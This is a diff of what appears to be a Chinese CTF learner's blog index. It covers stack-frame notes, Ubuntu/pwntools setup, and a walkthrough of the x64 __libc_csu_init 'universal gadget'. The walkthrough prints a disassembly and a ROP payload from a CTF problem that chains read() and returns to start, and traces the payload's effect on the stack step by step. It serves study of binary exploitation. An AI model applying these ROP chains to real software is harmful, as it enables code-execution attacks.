-网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
-        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
-<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+<p>这段时间看了不少的东西。<br>下面写一下对栈的一些理解：</p>
+<pre><code>Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。</code></pre><p>栈顶：esp<br>栈底：ebp</p>
+<p>在函数运行时，会开辟栈帧，一些数据被存进去</p>
+<pre><code>push   ebp       压栈 esp减小 存入ebp内容
+mov    ebp,esp        </code></pre><p>根据约定，程序从_main标签开始执行，这时会在 Stack 上为main建立一个栈帧，<br>并将 Stack 所指向的地址，写入 ESP 寄存器。<br>后面如果有数据要写入main这个帧，就会写在 ESP 寄存器所保存的地址。</p>
+<p>一个栈帧从高地址到低地址应该是</p>
+<pre><code>函数参数
+函数返回地址
+ebp                #这里到下面是一个栈帧，执行完后会执行返回地址里的内容
+栈内数据
+esp  </code></pre><p>待更新。。</p>
 ]]></content>
       <tags>
-        <tag>虚拟机配置</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>通用gadget原理分析</title>
-    <url>/2019/11/01/%E9%80%9A%E7%94%A8gadget%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<p>通用 gadget</p>
-<p>__libc_csu_init()</p>
-<p>我们知道在程序编译的过程中，会自动加入一些通用函数做初始化的工作，这些初始化函数都是相同的，所以我们可以考虑在这些函数中找到一些通用的 gadget，在 x64 程序中，就存在这样的 gadget。x64 程序的前六个参数依次通过寄存器 rdi、rsi、rdx、rcx、r8、r9 进行传递，我们所找的 gadget 自然也是针对这些寄存器进行操作的。</p>
-<p>函数 __libc_csu_init() 用于对 libc 进行初始化，只要程序调用了 libc，就一定存在这个函数。由于每个版本的 libc 都有一定区别，这里的版本如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ file /usr/lib/libc<span class="number">-2.26</span>.so</span><br><span class="line">/usr/lib/libc<span class="number">-2.26</span>.so: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /usr/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=f46739d962ec152b56d2bdb7dadaf8e576dbf6eb, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disassemble /r __libc_csu_init</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function __libc_csu_init:</span><br><span class="line">   <span class="number">0x00000000004007d0</span> &lt;+<span class="number">0</span>&gt;:     <span class="number">41</span> <span class="number">57</span>   push   r15</span><br><span class="line">   <span class="number">0x00000000004007d2</span> &lt;+<span class="number">2</span>&gt;:     <span class="number">41</span> <span class="number">56</span>   push   r14</span><br><span class="line">   <span class="number">0x00000000004007d4</span> &lt;+<span class="number">4</span>&gt;:     <span class="number">49</span> <span class="number">89</span> d7        mov    r15,rdx</span><br><span class="line">   <span class="number">0x00000000004007d7</span> &lt;+<span class="number">7</span>&gt;:     <span class="number">41</span> <span class="number">55</span>   push   r13</span><br><span class="line">   <span class="number">0x00000000004007d9</span> &lt;+<span class="number">9</span>&gt;:     <span class="number">41</span> <span class="number">54</span>   push   r12</span><br><span class="line">   <span class="number">0x00000000004007db</span> &lt;+<span class="number">11</span>&gt;:    <span class="number">4</span>c <span class="number">8</span>d <span class="number">25</span> <span class="number">16</span> <span class="number">06</span> <span class="number">20</span> <span class="number">00</span>    lea    r12,[rip+<span class="number">0x200616</span>]        # <span class="number">0x600df8</span></span><br><span class="line">   <span class="number">0x00000000004007e2</span> &lt;+<span class="number">18</span>&gt;:    <span class="number">55</span>      push   rbp</span><br><span class="line">   <span class="number">0x00000000004007e3</span> &lt;+<span class="number">19</span>&gt;:    <span class="number">48</span> <span class="number">8</span>d <span class="number">2</span>d <span class="number">16</span> <span class="number">06</span> <span class="number">20</span> <span class="number">00</span>    lea    rbp,[rip+<span class="number">0x200616</span>]        # <span class="number">0x600e00</span></span><br><span class="line">   <span class="number">0x00000000004007ea</span> &lt;+<span class="number">26</span>&gt;:    <span class="number">53</span>      push   rbx</span><br><span class="line">   <span class="number">0x00000000004007eb</span> &lt;+<span class="number">27</span>&gt;:    <span class="number">41</span> <span class="number">89</span> fd        mov    r13d,edi</span><br><span class="line">   <span class="number">0x00000000004007ee</span> &lt;+<span class="number">30</span>&gt;:    <span class="number">49</span> <span class="number">89</span> f6        mov    r14,rsi</span><br><span class="line">   <span class="number">0x00000000004007f1</span> &lt;+<span class="number">33</span>&gt;:    <span class="number">4</span>c <span class="number">29</span> e5        sub    rbp,r12</span><br><span class="line">   <span class="number">0x00000000004007f4</span> &lt;+<span class="number">36</span>&gt;:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>     sub    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x00000000004007f8</span> &lt;+<span class="number">40</span>&gt;:    <span class="number">48</span> c1 fd <span class="number">03</span>     sar    rbp,<span class="number">0x3</span></span><br><span class="line">   <span class="number">0x00000000004007fc</span> &lt;+<span class="number">44</span>&gt;:    ff <span class="number">15</span> f6 <span class="number">07</span> <span class="number">20</span> <span class="number">00</span>       call   QWORD PTR [rip+<span class="number">0x2007f6</span>]        # <span class="number">0x600ff8</span></span><br><span class="line">   <span class="number">0x0000000000400802</span> &lt;+<span class="number">50</span>&gt;:    <span class="number">48</span> <span class="number">85</span> ed        test   rbp,rbp</span><br><span class="line">   <span class="number">0x0000000000400805</span> &lt;+<span class="number">53</span>&gt;:    <span class="number">74</span> <span class="number">1f</span>   je     <span class="number">0x400826</span> &lt;__libc_csu_init+<span class="number">86</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000400807</span> &lt;+<span class="number">55</span>&gt;:    <span class="number">31</span> db   xor    ebx,ebx</span><br><span class="line">   <span class="number">0x0000000000400809</span> &lt;+<span class="number">57</span>&gt;:    <span class="number">0f</span> <span class="number">1f</span> <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    nop    DWORD PTR [rax+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x0000000000400810</span> &lt;+<span class="number">64</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> fa        mov    rdx,r15</span><br><span class="line">   <span class="number">0x0000000000400813</span> &lt;+<span class="number">67</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> f6        mov    rsi,r14</span><br><span class="line">   <span class="number">0x0000000000400816</span> &lt;+<span class="number">70</span>&gt;:    <span class="number">44</span> <span class="number">89</span> ef        mov    edi,r13d</span><br><span class="line">   <span class="number">0x0000000000400819</span> &lt;+<span class="number">73</span>&gt;:    <span class="number">41</span> ff <span class="number">14</span> dc     call   QWORD PTR [r12+rbx*<span class="number">8</span>]</span><br><span class="line">   <span class="number">0x000000000040081d</span> &lt;+<span class="number">77</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c3 <span class="number">01</span>     add    rbx,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0000000000400821</span> &lt;+<span class="number">81</span>&gt;:    <span class="number">48</span> <span class="number">39</span> dd        cmp    rbp,rbx</span><br><span class="line">   <span class="number">0x0000000000400824</span> &lt;+<span class="number">84</span>&gt;:    <span class="number">75</span> ea   jne    <span class="number">0x400810</span> &lt;__libc_csu_init+<span class="number">64</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000400826</span> &lt;+<span class="number">86</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>     add    rsp,<span class="number">0x8</span></span><br><span class="line">   <span class="number">0x000000000040082a</span> &lt;+<span class="number">90</span>&gt;:    <span class="number">5b</span>      pop    rbx</span><br><span class="line">   <span class="number">0x000000000040082b</span> &lt;+<span class="number">91</span>&gt;:    <span class="number">5</span>d      pop    rbp</span><br><span class="line">   <span class="number">0x000000000040082c</span> &lt;+<span class="number">92</span>&gt;:    <span class="number">41</span> <span class="number">5</span>c   pop    r12</span><br><span class="line">   <span class="number">0x000000000040082e</span> &lt;+<span class="number">94</span>&gt;:    <span class="number">41</span> <span class="number">5</span>d   pop    r13</span><br><span class="line">   <span class="number">0x0000000000400830</span> &lt;+<span class="number">96</span>&gt;:    <span class="number">41</span> <span class="number">5</span>e   pop    r14</span><br><span class="line">   <span class="number">0x0000000000400832</span> &lt;+<span class="number">98</span>&gt;:    <span class="number">41</span> <span class="number">5f</span>   pop    r15</span><br><span class="line">   <span class="number">0x0000000000400834</span> &lt;+<span class="number">100</span>&gt;:   c3      ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
-
-<p>从中提取出两段（必须以ret结尾），把它们叫做 rop1 和 rop2：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x000000000040082a</span> &lt;+<span class="number">90</span>&gt;:    <span class="number">5b</span>      pop    rbx</span><br><span class="line"><span class="number">0x000000000040082b</span> &lt;+<span class="number">91</span>&gt;:    <span class="number">5</span>d      pop    rbp</span><br><span class="line"><span class="number">0x000000000040082c</span> &lt;+<span class="number">92</span>&gt;:    <span class="number">41</span> <span class="number">5</span>c   pop    r12</span><br><span class="line"><span class="number">0x000000000040082e</span> &lt;+<span class="number">94</span>&gt;:    <span class="number">41</span> <span class="number">5</span>d   pop    r13</span><br><span class="line"><span class="number">0x0000000000400830</span> &lt;+<span class="number">96</span>&gt;:    <span class="number">41</span> <span class="number">5</span>e   pop    r14</span><br><span class="line"><span class="number">0x0000000000400832</span> &lt;+<span class="number">98</span>&gt;:    <span class="number">41</span> <span class="number">5f</span>   pop    r15</span><br><span class="line"><span class="number">0x0000000000400834</span> &lt;+<span class="number">100</span>&gt;:   c3      ret</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400810</span> &lt;+<span class="number">64</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> fa        mov    rdx,r15</span><br><span class="line"> <span class="number">0x0000000000400813</span> &lt;+<span class="number">67</span>&gt;:    <span class="number">4</span>c <span class="number">89</span> f6        mov    rsi,r14</span><br><span class="line"> <span class="number">0x0000000000400816</span> &lt;+<span class="number">70</span>&gt;:    <span class="number">44</span> <span class="number">89</span> ef        mov    edi,r13d</span><br><span class="line"> <span class="number">0x0000000000400819</span> &lt;+<span class="number">73</span>&gt;:    <span class="number">41</span> ff <span class="number">14</span> dc     call   QWORD PTR [r12+rbx*<span class="number">8</span>]</span><br><span class="line"> <span class="number">0x000000000040081d</span> &lt;+<span class="number">77</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c3 <span class="number">01</span>     add    rbx,<span class="number">0x1</span></span><br><span class="line"> <span class="number">0x0000000000400821</span> &lt;+<span class="number">81</span>&gt;:    <span class="number">48</span> <span class="number">39</span> dd        cmp    rbp,rbx</span><br><span class="line"> <span class="number">0x0000000000400824</span> &lt;+<span class="number">84</span>&gt;:    <span class="number">75</span> ea   jne    <span class="number">0x400810</span> &lt;__libc_csu_init+<span class="number">64</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400826</span> &lt;+<span class="number">86</span>&gt;:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>     add    rsp,<span class="number">0x8</span></span><br><span class="line"> <span class="number">0x000000000040082a</span> &lt;+<span class="number">90</span>&gt;:    <span class="number">5b</span>      pop    rbx</span><br><span class="line"> <span class="number">0x000000000040082b</span> &lt;+<span class="number">91</span>&gt;:    <span class="number">5</span>d      pop    rbp</span><br><span class="line"> <span class="number">0x000000000040082c</span> &lt;+<span class="number">92</span>&gt;:    <span class="number">41</span> <span class="number">5</span>c   pop    r12</span><br><span class="line"> <span class="number">0x000000000040082e</span> &lt;+<span class="number">94</span>&gt;:    <span class="number">41</span> <span class="number">5</span>d   pop    r13</span><br><span class="line"> <span class="number">0x0000000000400830</span> &lt;+<span class="number">96</span>&gt;:    <span class="number">41</span> <span class="number">5</span>e   pop    r14</span><br><span class="line"> <span class="number">0x0000000000400832</span> &lt;+<span class="number">98</span>&gt;:    <span class="number">41</span> <span class="number">5f</span>   pop    r15</span><br><span class="line"> <span class="number">0x0000000000400834</span> &lt;+<span class="number">100</span>&gt;:   c3      ret</span><br></pre></td></tr></table></figure>
-
-<p>我们可以看到rop1 中连续六个 pop，可以将栈顶的六个值传入pop rbx_rbp_r12_r13_r14_r15</p>
-<p>rop2中可以传递寄存器的值rdx(r13), rsi(r14), edi(r15d)</p>
-<p>rdi,rsi,rdx正好是64位传参的前三个寄存器<br>因此我们可以借此gadget给某个函数传入参数控制程序，接下来我分析一下利用gadget的流程。</p>
-<p>用我最近做的一个题的payload来说明<br>payload如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">"a"</span> * <span class="number">0x48</span> + p64(rop1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got)</span><br><span class="line"> + p64(<span class="number">8</span>) + p64(binsh_addr) + p64(<span class="number">1</span>)+</span><br><span class="line"> + p64(rop2)+<span class="string">"\x00"</span> * <span class="number">56</span>+p64(start_addr)+payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br></pre></td></tr></table></figure>
-
-<p>首先是栈溢出到函数返回地址，填充为rop1的地址,后面加上六个参数，再加上rop2,再填充56个字节，最后加上函数start的地址。后面填充’a’到200完成payload的输入</p>
-<p>仔细阅读rop1和rop2的汇编代码了解程序流程</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">有个地方思考时很容易乱，就是程序执行流eip指向执行的是代码段，但是是在栈里对数据进行处理的。</span><br></pre></td></tr></table></figure>
-
-<p>首先payload输入后，执行rop1的汇编</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ret指令会 </span><br><span class="line"></span><br><span class="line">将rsp加<span class="number">8</span> 则rsp会指向p64(<span class="number">0</span>)		即覆盖的第一个参数</span><br><span class="line"></span><br><span class="line">将函数返回地址传给eip </span><br><span class="line"></span><br><span class="line">eip指向函数返回地址，即rop1的地址，</span><br><span class="line">程序开始执行rop1里的汇编代码</span><br></pre></td></tr></table></figure>
-
-<p>由rop1可知pop指令将参数传给各个寄存器中<br>每次将栈里数据pop后rsp都会加上8<br>如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rbx &lt;-- <span class="number">0</span></span><br><span class="line">rbp &lt;-- <span class="number">1</span></span><br><span class="line">r12 &lt;-- read_got</span><br><span class="line">r13 &lt;-- <span class="number">8</span></span><br><span class="line">r14 &lt;-- binsh_addr</span><br><span class="line">r15 &lt;-- <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>此时rsp指向了rop2，<br>同样的，rop1的ret指令将</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">eip &lt;-- rop2的地址</span><br><span class="line">rsp+=<span class="number">8</span>;	指向了填充的<span class="number">56</span>*<span class="string">'a'</span></span><br></pre></td></tr></table></figure>
-
-<p>开始执行rop2的汇编代码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rdx &lt;-- r15 &lt;-- <span class="number">1</span></span><br><span class="line">rsi &lt;-- r14 &lt;-- binsh_addr</span><br><span class="line">edi &lt;-- r13 &lt;-- <span class="number">8</span></span><br><span class="line">将这三个参数传入了前三个寄存器中</span><br><span class="line">call   QWORD PTR [r12+rbx*<span class="number">8</span>]</span><br><span class="line">这句汇编就可以调用r12里的函数地址并将 上面寄存器的参数传给此函数</span><br></pre></td></tr></table></figure>
-
-<p>可以知道payload的调用函数为第三个参数<br>传入函数的三个参数<br>分别在payload传入的第6，5，4个参数</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">接着</span><br><span class="line">add    rbx,<span class="number">0x1</span>  （rbx=<span class="number">1</span>）</span><br><span class="line">cmp    rbp,rbx   (rbp=<span class="number">1</span>,rbx=<span class="number">1</span>)</span><br><span class="line">jne    <span class="number">0x400810</span> &lt;__libc_csu_init+<span class="number">64</span>&gt;</span><br><span class="line"><span class="comment">//有下面的指令解释可以知道相等不跳转</span></span><br><span class="line">所以继续执行下面的汇编</span><br><span class="line">add    rsp,<span class="number">0x8</span></span><br><span class="line">pop    rbx</span><br><span class="line">   pop    rbp</span><br><span class="line">   pop    r12</span><br><span class="line">   pop    r13</span><br><span class="line">   pop    r14</span><br><span class="line">   pop    r15</span><br><span class="line">这几句将rsp+<span class="number">7</span>*<span class="number">8</span>就是加上了<span class="number">56</span></span><br><span class="line">由payload知道，此时rsp正好跳过了<span class="number">56</span>*<span class="string">'a'</span>指向了start函数的地址</span><br><span class="line">最后ret指令</span><br><span class="line">eip &lt;-- start地址</span><br></pre></td></tr></table></figure>
-
-<p>到这里通用gadget完成了一次调用</p>
-<p>  这个payload的作用就是调用了read函数读取内容到要填写binsh的地址<br>并重新执行函数start</p>
-<p>下面附上我手画的一张栈空间结构图，可以根据这个分析一下流程！</p>
-<p><img alt data-src="/2019/11/01/通用gadget原理分析/1.jpg" class="lazyload"></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">指令cmp ax,bx 的逻辑含义是比较ax和bx的值，如果执行后：</span><br><span class="line"><span class="number">1.</span>  zf=<span class="number">1</span> ===&gt; (ax)=(bx)</span><br><span class="line"><span class="number">2.</span>  zf=<span class="number">0</span> ===&gt; (ax)!=(bx)</span><br><span class="line"><span class="number">3.</span>  cf=<span class="number">1</span> ===&gt; (ax)&lt;(bx)</span><br><span class="line"><span class="number">4.</span>  cf=<span class="number">0</span> ===&gt; (ax)&gt;=(bx)</span><br><span class="line"><span class="number">5.</span>  cf=zf=<span class="number">0</span> ===&gt; (ax)&gt;(bx)</span><br><span class="line"><span class="number">6.</span>  cf=<span class="number">1</span>或zf=<span class="number">1</span> ===&gt; (ax)&lt;=(bx)</span><br><span class="line">cmp指令的比较结果需要通过条件转移指令来检测。</span><br><span class="line">|指令 |解释 |含义 |检测的相关标志位|</span><br><span class="line">|-------|-------|-------|----------------|</span><br><span class="line">|je|e:equal|等于则转移|zf=<span class="number">1</span>|</span><br><span class="line">|jne|ne:<span class="keyword">not</span> equal|不等于则转移|zf=<span class="number">0</span>|</span><br><span class="line">|jb|b:below|低于则转移|cf=<span class="number">1</span>|</span><br><span class="line">|jnb|nb:<span class="keyword">not</span> below| 不低于则转移| cf=<span class="number">0</span>|</span><br><span class="line">|ja |a:above| 高于则转移| cf=<span class="number">0</span>且zf=<span class="number">0</span>|</span><br><span class="line">|jna| na:<span class="keyword">not</span> above| 不高于则转移| cf=<span class="number">1</span>或zf=<span class="number">1</span>|</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>pwn学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>链接</title>
-    <url>/2019/11/05/%E9%93%BE%E6%8E%A5/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>虚拟机配置</title>
-    <url>/2019/11/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>#今天讲的是pwndbg的一些基本操作</p>
-<p><strong>1.首先下载Ubuntu</strong><br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
-<p><strong>2.安装VMtools</strong></p>
-<p><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装时会出现很多提示 输入yes/no  都选 yes，</span><br><span class="line"></span><br><span class="line">如果提示 的是 路径， 则直接回车就好。</span><br></pre></td></tr></table></figure>
-
-<p><strong>3.更换软件源</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，</span><br><span class="line">相当于软件的下载服务器和更新服务器，</span><br><span class="line">只不过不是某款软件的，而是该系统所有软件的下载服务器</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://blog.csdn.net/meteor_s/article/details/81301252" target="_blank" rel="noopener">https://blog.csdn.net/meteor_s/article/details/81301252</a></p>
-<p><strong>4.安装pip</strong></p>
-<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
-<p>安装直接在终端输入：  sudo apt install python-pip</p>
-<p><strong>5.更改pip源</strong><br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的</p>
-<p>创建一个配置文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir ~/.pip/</span><br><span class="line">cd ./.pip/</span><br><span class="line">touch pip.conf</span><br><span class="line">sudo gedit pip.conf</span><br></pre></td></tr></table></figure>
-
-<p>按照链接更改配置文件<br><a href="https://blog.csdn.net/yuzaipiaofei/article/details/80891108" target="_blank" rel="noopener">https://blog.csdn.net/yuzaipiaofei/article/details/80891108</a></p>
-<p><strong>6.安装pwntools</strong></p>
-<p><a href="https://www.cnblogs.com/cai00/p/10696728.html" target="_blank" rel="noopener">https://www.cnblogs.com/cai00/p/10696728.html</a></p>
-<p><strong>7.安装pwndbg</strong><br><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
-]]></content>
-      <tags>
-        <tag>虚拟机配置</tag>
+        <tag>有关栈</tag>
       </tags>
   </entry>
   <entry>
@@ -645,6 +519,132 @@ io.sendline(&quot;5&quot;)
 io.interactive()    </code></pre>]]></content>
       <tags>
         <tag>做题题解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>虚拟机配置</title>
+    <url>/2019/11/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>#今天讲的是pwndbg的一些基本操作</p>
+<p><strong>1.首先下载Ubuntu</strong><br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
+<p><strong>2.安装VMtools</strong></p>
+<p><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装时会出现很多提示 输入yes/no  都选 yes，</span><br><span class="line"></span><br><span class="line">如果提示 的是 路径， 则直接回车就好。</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.更换软件源</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，</span><br><span class="line">相当于软件的下载服务器和更新服务器，</span><br><span class="line">只不过不是某款软件的，而是该系统所有软件的下载服务器</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/meteor_s/article/details/81301252" target="_blank" rel="noopener">https://blog.csdn.net/meteor_s/article/details/81301252</a></p>
+<p><strong>4.安装pip</strong></p>
+<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
+<p>安装直接在终端输入：  sudo apt install python-pip</p>
+<p><strong>5.更改pip源</strong><br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的</p>
+<p>创建一个配置文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir ~/.pip/</span><br><span class="line">cd ./.pip/</span><br><span class="line">touch pip.conf</span><br><span class="line">sudo gedit pip.conf</span><br></pre></td></tr></table></figure>
+
+<p>按照链接更改配置文件<br><a href="https://blog.csdn.net/yuzaipiaofei/article/details/80891108" target="_blank" rel="noopener">https://blog.csdn.net/yuzaipiaofei/article/details/80891108</a></p>
+<p><strong>6.安装pwntools</strong></p>
+<p><a href="https://www.cnblogs.com/cai00/p/10696728.html" target="_blank" rel="noopener">https://www.cnblogs.com/cai00/p/10696728.html</a></p>
+<p><strong>7.安装pwndbg</strong><br><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+]]></content>
+      <tags>
+        <tag>虚拟机配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ubuntu16.04配置</title>
+    <url>/2019/10/11/ubuntu16-04%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
+<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
+<p>#拍快照</p>
+<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
+<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
+<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
+<p>如果提示 的是 路径， 则直接回车就好。</p>
+<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
+<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
+<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
+https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
+https://www.cnblogs.com/flyinggod/p/7979108.html
+不推荐：https://blog.csdn.net/xkwy100/article/details/80301156
+
+解决问题E: Could not get lock /var/lib/apt/lists/lock
+https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
+<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
+<pre><code>安装：  sudo apt install python-pip
+
+遇到问题，    
+        Unable to locate package python-pip
+解决方法： 更新软件源
+        sudo apt-get update
+
+网址    https://www.jianshu.com/p/568aab038d4c
+    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
+<pre><code>sudo mkdir ~/.pip/
+cd ./.pip/
+touch pip.conf
+sudo gedit pip.conf 
+
+网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
+        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
+<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+]]></content>
+      <tags>
+        <tag>虚拟机配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>链接</title>
+    <url>/2019/11/05/%E9%93%BE%E6%8E%A5/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>通用gadget原理分析</title>
+    <url>/2019/11/01/%E9%80%9A%E7%94%A8gadget%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p>通用 gadget</p>
+<p>__libc_csu_init()</p>
+<p>我们知道在程序编译的过程中，会自动加入一些通用函数做初始化的工作，这些初始化函数都是相同的，所以我们可以考虑在这些函数中找到一些通用的 gadget，在 x64 程序中，就存在这样的 gadget。x64 程序的前六个参数依次通过寄存器 rdi、rsi、rdx、rcx、r8、r9 进行传递，我们所找的 gadget 自然也是针对这些寄存器进行操作的。</p>
+<p>函数 __libc_csu_init() 用于对 libc 进行初始化，只要程序调用了 libc，就一定存在这个函数。由于每个版本的 libc 都有一定区别，这里的版本如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ file /usr/lib/libc<span class="number">-2.26</span>.so</span><br><span class="line">/usr/lib/libc<span class="number">-2.26</span>.so: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /usr/lib/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=f46739d962ec152b56d2bdb7dadaf8e576dbf6eb, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br></pre></td></tr></table></figure>
+
